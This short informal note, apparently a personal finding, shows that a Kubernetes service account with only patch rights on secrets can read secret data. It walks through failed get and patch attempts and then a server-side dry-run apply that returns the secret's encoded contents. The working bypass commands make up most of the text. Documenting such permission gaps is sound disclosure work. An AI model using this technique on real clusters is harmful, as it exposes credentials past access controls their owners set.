
if you have a k8s principal with only `patch` permissions to secrets, you can use those permissions to leak the secret data (as long as you know the secret name).

certain attempts will fail:

```
~ 05/05/25 13:53:03 👻: kubectl get secret test-secret -n clholm --as=$sa:clholm:prog
Error from server (Forbidden): secrets "test-secret" is forbidden: User "system:serviceaccount:clholm:prog" cannot get resource "secrets" in API group "" in the namespace "clholm"
```
```
~ 05/05/25 13:53:19 👻: kubectl patch secret test-secret -n clholm  -p '{}' -o yaml --as=$sa:clholm:prog
Error from server (Forbidden): secrets "test-secret" is forbidden: User "system:serviceaccount:clholm:prog" cannot get resource "secrets" in API group "" in the namespace "clholm"
```
```
~ 05/05/25 13:53:23 👻: kubectl patch secret test-secret -n clholm --as=$sa:clholm:prog --type=strategic -p '{"metadata":{"annotations":{"test":"test"}}}' -o yaml
Error from server (Forbidden): secrets "test-secret" is forbidden: User "system:serviceaccount:clholm:prog" cannot get resource "secrets" in API group "" in the namespace "clholm"
```

but for some reason, using these flags will allow you to see the secret data:

```
~ 05/05/25 13:53:52 👻: kubectl apply -f - --server-side --dry-run=server -o yaml --as=$sa:clholm:prog <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: test-secret
  namespace: clholm
EOF
Warning: failed to migrate kubectl.kubernetes.io/last-applied-configuration for Server-Side Apply. This is non-fatal and will be retried next time you apply. Error: Apply failed with 1 conflict: conflict with "kubectl-client-side-apply" using v1: .metadata.annotations.kubectl.kubernetes.io/last-applied-configuration
apiVersion: v1
data:
  data: dGVzdCE=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"name":"test-secret","namespace":"clholm"}}
  creationTimestamp: "2025-05-05T16:05:42Z"
  name: test-secret
  namespace: clholm
  resourceVersion: "51234905"
  uid: d4444444-a046-4d65-bc8e-b99991234599
type: Opaque
```

this is probably documented somewhere else, but idk where. 